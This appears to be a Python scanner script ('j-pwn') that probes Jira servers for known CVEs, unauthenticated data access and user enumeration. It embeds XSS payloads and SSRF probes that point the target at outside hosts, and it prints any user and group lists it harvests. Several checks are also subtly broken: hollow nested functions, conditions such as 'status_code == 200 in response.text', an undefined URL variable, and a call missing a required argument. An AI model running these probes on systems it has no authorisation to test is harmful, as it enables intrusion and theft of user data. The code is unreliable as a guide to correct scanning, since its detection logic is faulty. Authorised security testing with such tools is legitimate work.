import argparse
import requests
from urllib.parse import urlparse
import colorama
from colorama import Fore, Style
import time
import os
import sys
import random
import json
from urllib.parse import urlparse
import urllib3

'''
import each module from vuln_checks/
'''
import vuln_checks

# Suppress InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

colorama.init()


from vuln_checks import *

def banner():

    print(f"""

             ██╗      ██████╗ ██╗    ██╗███╗   ██╗
             ██║      ██╔══██╗██║    ██║████╗  ██║
             ██║█████╗██████╔╝██║ █╗ ██║██╔██╗ ██║
        ██   ██║╚════╝██╔═══╝ ██║███╗██║██║╚██╗██║
        ╚█████╔╝      ██║     ╚███╔███╔╝██║ ╚████║
         ╚════╝       ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
         ** Hack the Planet ** [carnal0wnage]
                                                  

        """)

def test_jira_vulns(url):
    vulnerabilities= []
    dashboard_url = f"{url}rest/api/2/dashboard?maxResults=100"
    project_category_url = f"{url}rest/api/2/projectCategory?maxResults=1000"
    resolution_url = f"{url}rest/api/2/resolution"
    project_url = f"{url}rest/api/2/project?maxResult=100"
    admin_projects_url = f"{url}rest/menu/latest/admin"
    service_desk_url = f"{url}servicedesk/customer/user/login"
    service_desk_signup = f"{url}servicedesk/customer/user/signup"  #todo
    signup_url = f"{url}secure/Signup!default.jspa"
    open_project_dashboard_url = f"{url}secure/ConfigurePortalPages!default.jspa?view=popular"
    open_project_filter_url = f"{url}secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false"

    gadgets_url = f"{url}rest/config/1.0/directory"


    query_component_url = f"{url}rest//secure/QueryComponent!Default.jspa"
    user_picker_url = f"{url}rest/api/2/user/picker?query=admin"
    JRASERVER_url = f"{url}rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"
    collaborator = "https://google.com"
    #print ("+ Using collaborator as:", collaborator)
    #collaborator = f"https://victomhost:1337@example.com" #ask user for collaborator URL
    #cve20198451 = f"{url}/plugins/servlet/gadgets/makeRequest?url={collaborator}" #/plugins/servlet/gadgets/makeRequest?url=
    contact_admin_url = f"{url}secure/ContactAdministrators!default.jspa"
    CVE201820824 = f"{url}plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
    cve202014179 = f"{url}secure/QueryComponent!Default.jspa"
    cve202014181 = f"{url}ViewUserHover.jspa?username=Admin"
    cve202014181_1 = f"{url}secure/ViewUserHover.jspa"
    cve20185230 = f"{url}issues/"
    jupf = f"{url}secure/ManageFilters.jspa?filter=popular&filterView=popular"
    xss = f"{url}pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert(‘XSS’)%22%3E.vm"
    cve20193403 = f"{url}rest/api/2/user/picker?query=admin"
    cve20198442_url = f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
    cve20179506 = f"{url}plugins/servlet/oauth/users/icon-uri?consumerUri={collaborator}"
    cve20193402 = f"{url}secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&Search=Search"
    cve20182082 = f"{url}plugins/servlet/Wallboard/?dashboardId"
    cve20179506 = f"{url}plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
    cve20220540 = f"{url}InsightPluginShowGeneralConfiguration.jspa;"
    cve202205401 = f"{url}secure/WBSGanttManageScheduleJobAction.jspa;"




    # Check for unauthenticated access to JIRA dashboards
    check_result = check_unauthenticated_dashboard_access(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Check for unauthenticated access to JIRA project categories
    check_result = check_unauthenticated_project_categories(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Check for unauthenticated access to projects
    check_result = check_unauthenticated_projects(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Check for unauthenticated access to JIRA resolutions
    check_result = check_unauthenticated_resolutions(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Check for unauthenticated access to JIRA admin projects
    check_result = check_unauthenticated_admin_projects(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)


    # Check for unauthenticated access to installed JIRA gadgets
    try:
        response = requests.get(gadgets_url, verify=False)
        if response.status_code == 200:
            vulnerabilities.append(f"+ Unauthenticated access to installed JIRA gadgets | URL : {gadgets_url}")
    except:
        pass


    # Checks for open Jira signup. Manually attempt to signup
    check_result = check_open_jira_signup(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Check for open project dashboard
    check_result = check_open_project_dashboard(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Check for open project filter
    check_result = check_open_project_filter(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)
    
    # Check for Unauthorized User Enumeration (UserPickerBrowser.jspa
    check_result = check_unauthorized_user_enumeration(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    '''
    let's do CVE checks yo
    '''

    # Check for CVE-2019-3403
    check_result = check_cve_2019_3403(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)


    # Check for CVE-2020-14179
    try:
        response = requests.get(query_component_url, verify=False)
        if response.status_code == 200 and "custom field" in response.text:
            vulnerabilities.append(f"+ CVE-2020-14179 : Information disclosure about custom fields and custom SLA | URL : {query_component_url}")
    except:
        pass

    # Check for CVE-2022-0540
    try:
        response = requests.get(cve20220540, verify=False)
        if response.status_code == 200 and "General Insight Configuration" in response.text:
            vulnerabilities.append(f"+ CVE-2022-0540 : Atlassian Jira Seraph - Authentication Bypass | URL : {cve20220540}")
    except:
        pass

    # Check for CVE-2022-05401
    try:
        response = requests.get(cve202205401, verify=False)
        if response.status_code == 200 and "WBS Gantt-Chart" in response.text:
            vulnerabilities.append(f"+ CVE-2022-0540 : Atlassian Jira Seraph Authentication Bypass RCE（CVE-2022-0540) | URL : {cve202205401}")
    except:
        pass


    # Check for CVE-2019-8449
    def check_cve_2019_8449(url):
        JRASERVER_url = f"{url}rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true"

    try:
        response = requests.get(JRASERVER_url, verify=False)

        # Check for the vulnerability and parse the response
        if response.status_code == 200 and "users" in response.text:
            vulnerabilities.append(f"+ CVE-2019-8449: The /rest/api/latest/groupuserpicker resource in Jira before version 8.4.0 allows remote attackers to enumerate usernames via an information disclosure vulnerability. | URL : {JRASERVER_url}")

            data = response.json()
            users = data.get("users", {}).get("users", [])
            total_users = data.get("users", {}).get("total", "N/A")
            user_header = data.get("users", {}).get("header", "N/A")

            groups = data.get("groups", {}).get("groups", [])
            total_groups = data.get("groups", {}).get("total", "N/A")
            group_header = data.get("groups", {}).get("header", "N/A")

            print(f"\n{Fore.GREEN}+ CVE-2019-8449 Detected{Style.RESET_ALL}")
            print(f"  URL: {JRASERVER_url}")
            print(f"  Total Users Found: {total_users}")
            print(f"  User Header: {user_header}")
            print(f"  User Details: {users if users else 'No users listed.'}")
            print(f"  Total Groups Found: {total_groups}")
            print(f"  Group Header: {group_header}")
            print(f"  Group Details: {groups if groups else 'No groups listed.'}")
        elif response.status_code == 403:
            print(f"{Fore.YELLOW}\n- No CVE-2019-8449 vulnerability detected on: {JRASERVER_url}{Style.RESET_ALL}")

        else:
            print(f"{Fore.YELLOW}\n- No CVE-2019-8449 vulnerability detected on: {JRASERVER_url}{Style.RESET_ALL}")
    except json.JSONDecodeError:
        print(f"{Fore.RED}- Failed to parse JSON response from: {JRASERVER_url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while checking {JRASERVER_url} error:{e}{Style.RESET_ALL}")
 
    check_cve_2019_8449(url)

    #cve-2019-8451:ssrf-response-body    
    try:
        response = requests.get(cve20198451, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-8451 [SSRF] : The /plugins/servlet/gadgets/makeRequest resource in Jira before version 8.4.0 allows remote attackers to access the content of internal network resources via a Server Side Request Forgery (SSRF) vulnerability due to a logic bug in the JiraWhitelist class. | URL : {cve20198451}")
    except:
        pass

   
  


    
    

    def check_cve_2019_11581(url):
        '''
        Checks for CVE-2019-11581, a potential Remote Code Execution vulnerability in Jira.
        '''
        contact_admin_url = f"{url}secure/ContactAdministrators!default.jspa"

    try:
        response = requests.get(contact_admin_url, verify=False)

        # Check for the vulnerability
        if response.status_code == 200:
            response_text = response.text
            # print(response_text) DEBUG

            if ("administrator has not yet configured" in response_text or 
                "no ha configurado" in response_text or "noch nicht konfiguriert" in response_text or "не настроил эту контактную форму" in response_text or "管理员尚未配置此联系表" in response_text):
                print(f"{Fore.YELLOW}\n- No CVE-2019-11581 vulnerability detected on: {contact_admin_url}") 
                print(f"{Fore.YELLOW}\t **The contact form is not configured and most likely NOT vulnerable.**{Style.RESET_ALL}")
                # print(f"  URL: {contact_admin_url}")
            else:
                vulnerabilities.append(f"+ CVE-2019-11581 [Potential RCE]: Manual exploitation required | URL: {contact_admin_url}")
                print(f"\n{Fore.GREEN}+ CVE-2019-11581 Detected - The contact form is configured and potential vulnerable [MANUAL REVIEW REQUIRED]{Style.RESET_ALL}")
                print(f"  URL: {contact_admin_url}")
                print(f"  Note: Exploitation requires manual steps.")
                print(f"  Note: For this issue to be exploitable at least one of the following conditions must be met:")
                print(f"  1. An SMTP server has been configured in Jira and the Contact Administrators Form is enabled")
                print(f"  2. or an SMTP server has been configured in Jira and an attacker has \"JIRA Administrators\" access.")
                print(f"  Note:Refer to: https://jira.atlassian.com/browse/JRASERVER-69532 && https://hackerone.com/reports/706841")
        elif response.status_code == 403:
            print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")

        else:
            print(f"{Fore.YELLOW}- No CVE-2019-11581 vulnerability detected on: {contact_admin_url}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}{Style.RESET_ALL}")

    except Exception as e:
            print(f"{Fore.RED}* CVE-2019-11581 An error occurred while checking {contact_admin_url}: {e}{Style.RESET_ALL}")

    check_cve_2019_11581(url)

    #cve-2018-20824
    try:
        response = requests.get(CVE201820824, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2018-20824 [XSS] :  vulnerable to Server Side Request Forgery (SSRF). This allowed a XSS and or a SSRF attack to be performed. More information about the Atlassian OAuth plugin issue see https://ecosystem.atlassian.net/browse/OAUTH-344 . When running in an environment like Amazon EC2, this flaw can used to access to a metadata resource that provides access credentials and other potentially confidential information. | URL : {CVE201820824}")
    except:
        pass 

    #cve-2020-14179 
    try:
        response = requests.get(cve202014179, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2020-14179 [Information Disclosure] : Atlassian Jira Server and Data Center allow remote, unauthenticated attackers to view custom field names and custom SLA names via an Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint. | URL : {cve202014179}")
    except:
        pass 

    #cve-2020-14181 
    try:
        response = requests.get(cve202014181, verify=False)
        if response.status_code == 200 and "admin" in response.text:
            vulnerabilities.append(f"+ CVE-2020-14181 [User Enumeration] : Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. | URL : {cve202014181}")
    except:
        pass    

    #cve-2020-14181 test case 2 
    try:
        response = requests.get(cve202014181_1, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2020-14181 [User Enumeration] : Atlassian Jira Server and Data Center allow an unauthenticated user to enumerate users via an Information Disclosure vulnerability in the /ViewUserHover.jspa endpoint. | URL : {cve202014181_1}")
    except:
        pass 

    #CVE-2018-5230 = /issues/
    try:
        response = requests.get(cve20185230, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2018-5230 [Potential XSS] : https://hackerone.com/reports/380354 | URL : {cve20185230}")
    except:
        pass

    #jira-unauth-popular-filters 
    try:
        response = requests.get(jupf, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ jira-unauth-popular-filters : https://hackerone.com/reports/197726 | URL : {jupf}")
    except:
        pass

    # XSS 
    try:
        response = requests.get(xss, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ Possible XSS | URL : {xss}")
    except:
        pass       
   
    #CVE-2019-3403
    try:
        response = requests.get(cve20193403, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-3403 [Information disclosured vulnerability] : Visit the URL address,you can check the user whether is exist on this host. | URL : {cve20193403}")
    except:
        pass 
 

    #CVE-2017-9506
    try:
        response = requests.get(cve20179506, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2017-9506 : https://blog.csdn.net/caiqiiqi/article/details/89017806 | URL : {cve20179506}")
    except:
        pass     

    #CVE-2019-3402
    try:
        response = requests.get(cve20193402, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ CVE-2019-3402 [Possible XSS]：XSS in the labels gadget  | URL : {cve20193402}")
    except:
        pass  

    #CVE-2018-2082
    try:
        response = requests.get(cve20182082, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append("+ CVE-2018-20824 [Possible XSS]：Jira XSS in WallboardServlet through the cyclePeriod parameter append target with /plugins/servlet/Wallboard/?dashboardId=10100&dashboardId=10101&cyclePeriod=(function(){alert(document.cookie);return%2030000;})()&transitionFx=none&random=true")
    except:
        pass  

    # CVE-2017-9506
    try:
        response = requests.get(cve20179506, verify=False)
        if response.status_code == 200 in response.text:
            vulnerabilities.append(f"+ SSRF vulnerability in confluence Ref: https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a | URL : {dashboard_url}")
    except:
        pass


    #CVE-2019-8442
    def check_cve_2019_8442(url):
        print(f"{Fore.YELLOW}\nINFO: Checking for CVE-2019-8442")
    # List of URLs to check
        urls_to_check = [
            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml",
            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml",
            f"{url}s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties",
    ]
    
        for target_url in urls_to_check:
            print(f"{Fore.YELLOW}\n- Checking URL: {target_url}")
            try:
                # Stream response to handle large files
                response = requests.get(target_url, verify=False, allow_redirects=False, stream=True)
                print(f"{Fore.YELLOW}- HTTP Status Code: {response.status_code}")

                contains_dependency = False  # Flag to check for the keyword
            
                for chunk in response.iter_lines(decode_unicode=True):
                    if response.status_code == 200 and "dependency" in chunk:
                        contains_dependency = True
                        break  # Stop further processing if keyword is found
                
                if response.status_code == 200:
                    if contains_dependency:
                        vulnerabilities.append(f"+ CVE-2019-8442 [Information Disclosure] : https://jira.atlassian.com/browse/JRASERVER-69241 visit the affected url,the server will leaking some server's information | URL : {target_url}")
                        print(f"{Fore.GREEN}+ CVE-2019-8442 Detected: Information Disclosure vulnerability found!{Style.RESET_ALL}")
                        print(f"  URL: {target_url}")
                        #print(f"  Visit the URL for more details: https://jira.atlassian.com/browse/JRASERVER-69241")
                    else:
                        print(f"{Fore.BLUE}- NEEDS MANUAL REVIEW - No sensitive information detected at {target_url}{Style.RESET_ALL}")
                    
                elif response.status_code == 302:
                    location = response.headers.get("Location", "No Location header found") 
                    print(f"{Fore.YELLOW}- Redirection Detected (302) for: {target_url}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}- Location Header: {location}")
                    print(f"{Fore.YELLOW}- This program doesnt follow 302 - Try: curl -k -v \'{target_url}\'{Style.RESET_ALL}")
                else:
                    print(f"{Fore.BLUE}- No vulnerability detected at {target_url}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}* An error occurred while checking {target_url}: {e}{Style.RESET_ALL}")

    check_cve_2019_8442(url)

    '''
    Service Desk Checks and Modules go here
    '''
    check_servicedesk_info(url)

    # Checks for open service desk login. Manually attempt to signup
    check_result = check_open_servicedesk_login(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)

    # Checks for open service desk signup. Manually attempt to signup
    check_result = check_open_servicedesk_signup(url)
    if check_result:  # Only append if check_result is not empty
        vulnerabilities.append(check_result)


    # print(vulnerabilities) #debug

    process_vulnerabilities(vulnerabilities)

'''
Function to process the vulnerabilities and print them at the end to the terminal
'''
def process_vulnerabilities(vulnerabilities):
    try:
        if vulnerabilities:
            print(f"{Fore.GREEN}\n+ The following vulnerabilities were found:{Style.RESET_ALL}")
            for vuln in vulnerabilities:
                print(f"{vuln}")
        else:
            print("- No vulnerabilities were found.")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while parsing vulns: {e}{Style.RESET_ALL}")




def check_jira(url, path):
    # Parse the URL to check its components
    parsed_url = urlparse(url)

    if not parsed_url.scheme:  # No scheme provided (e.g., just an IP or domain)
        url = "https://" + url  # Default to https:// if no scheme is provided
    else:  # Scheme is present (e.g., http://example.com or https://example.com)
        url = f"{parsed_url.scheme}://{parsed_url.netloc}"  # Keep the provided scheme and netloc

    print(f"{Fore.YELLOW}[Scanning] : {url}{Style.RESET_ALL}")

    try:
        full_url = url + path
        #print(full_url)
        response = requests.get(full_url +'rest/api/2/serverInfo', verify=False)
        if response.status_code == 200 and "serverTitle" in response.json():
            print(f"{Fore.GREEN}+ JIRA is running on:", url, f"{Style.RESET_ALL}")
            
            data = response.json()

            base_url = data.get("baseUrl", "N/A")
            version = data.get("version", "N/A")
            deployment_type = data.get("deploymentType", "N/A")
            build_number = data.get("buildNumber", "N/A")
            build_date = data.get("buildDate", "N/A")
            server_title = data.get("serverTitle", "N/A")

            print("\nJIRA Server Information:")
            print(f"  Base URL        : {base_url}")
            print(f"  Version         : {version}")
            print(f"  Deployment Type : {deployment_type}")
            print(f"  Build Number    : {build_number}")
            print(f"  Build Date      : {build_date}")
            print(f"  Server Title    : {server_title}")

            print(f"{Fore.YELLOW}\n- Running Vuln Checks{Style.RESET_ALL}")


            # Run all the checks
            test_jira_vulns(full_url)
        else:
            print("- JIRA is not running on:", url)
            print("- try python3 j-pwn.py --single",url, "-p /jira/")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while checking {url}: {e}{Style.RESET_ALL}")


def main():
    banner()
    parser = argparse.ArgumentParser(description="Check if JIRA is running on a server or list of servers")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--single", "-s", metavar="URL", help="Check if JIRA is running on a single server")
    parser.add_argument("--path", "-p", metavar="PATH", default="/", help="Specify the API path to check (default: /")
    group.add_argument("--list", "-l", metavar="FILE", help="Check if JIRA is running on a list of servers")
    args = parser.parse_args()

    if args.single:
        check_jira(args.single, args.path)

    else:
        urls = set()
        with open(args.list, "r") as file:
            for line in file:
                url = line.strip()
                domain = urlparse(url).netloc
                if domain not in urls:
                    urls.add(domain)
                    check_jira(domain)

if __name__ == "__main__":
    main()
